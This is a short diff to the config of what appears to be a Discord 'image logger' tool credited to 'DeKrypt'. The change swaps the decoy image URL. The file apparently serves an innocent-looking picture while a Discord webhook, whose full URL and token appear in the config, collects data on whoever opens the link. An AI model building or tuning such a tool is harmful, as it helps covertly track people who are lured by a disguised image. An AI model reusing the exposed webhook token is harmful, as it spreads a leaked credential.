@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1420411770861781144/lsIltFbBeJsslZthVcxKRoPXQiCqXMFeBq93w5kVpHvxcIYKzOw6fms23W_Z2SyAjhvS",
-    "image": "https://tenor-wine-five.vercel.app/api/dcimage", # You can also have a custom image by using a URL argument
+    "image": "https://images8.alphacoders.com/135/thumb-1920-1354126.jpeg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
